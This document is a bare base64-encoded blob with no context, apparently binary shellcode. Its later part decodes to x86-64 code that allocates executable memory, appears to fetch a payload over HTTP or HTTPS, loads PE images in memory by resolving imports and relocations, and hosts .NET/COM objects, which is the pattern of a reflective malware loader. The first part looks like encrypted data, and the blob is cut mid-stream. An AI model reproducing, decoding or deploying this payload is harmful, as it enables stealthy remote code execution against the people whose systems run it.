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GUTJoAaGdTm4T9SKxRzB7NQR3Zm5wEIbGDw3bNrSUCwJlpeiH5slbayFvj2OloT4zivwT7eIs+dB0qrnUToY2IFF+0Wa25IaP4y443GCAX24W1D6KH1lYzNE7a93QVlg7MvNJyd9vbJdjvINzjJPkSf0jkzt8T9R5YXYevWS4iakehRzIsDJkaQgOamnfkj/4iW3UeabMHNVSc8mVPEtZwajM/iEbEbCgz85T8Kl3hvWa5M4SxeP/1zrKUgN/J6XpEddJUFncCBSRk23j6B+1TX4tcifBJw3ZgN56cVhoUN68muEZjxPe7k+VriYCjWfC6ARLtYA9pFnf88WcGITis5bVpBhU6Cc6ZpHsAVOAk/Tpks5rPtQ6dR+HjisgxtlBuW/EQWCqFJRSvUCGm/ieNT/Ool0wWvppMFUlQD6lDxligOAbHysp8LsZhBpSbwvQtTkqj80JyFWVVIieVIgeywAAAASIlNEEiLRRBIiUXoSItF6EiLQEhIiUXgSItF6EiLSChIi1XgSItF6EmJyEiJweh/NAAASIlF2EiLRehIi0BQSIlF4EiLRehIi0goSItV4EiLRehJichIicHoVDQAAEiJRdBIg33YAHQHSIN90AB1Crj/////6fUDAABIi0XoiwCJwkiLRdhBuQQAAABBuAAwAAC5AAAAAP/QSIlFyEiDfcgAdQq4/////+nBAwAASItF6IsAicJIi0XISYnQSItVEEiJwej0OAAASItFyEiJRehIjYVw////QbhAAAAAugAAAABIicHoijgAAEiLRehIBTACAABIiUXASItF6IsAicBMjYDQ/f//SItF6EiNUBRIi0XoSIPABEiLTcBNicFJichIicHoNj0AAEiLRehIi0AoSItV6EiNihgGAABIicLo/TkAAEiJRbhIi0XoSIuAGAcAAEg7RbgPhVgCAABIi0XoSItIKEiLRehIi1AwSItF6EmJyEiJweg1MwAASInCSItF6EiJUDBIi0XoSItAMEiFwHUKuP/////p0AIAAMdF/AAAAADrKkiLRehIi0Awi1X8SMHiBUiNijACAABIi1XoSAHKSIPCCEiJ0f/Qg0X8AUiLReiLgDQCAAA7Rfx3x8dF/AEAAADrVEiLRehIi0goSItF6ItV/EiDwgZIixTQSItF6EmJyEiJweiiMgAASInBSItF6ItV/EiDwgZIi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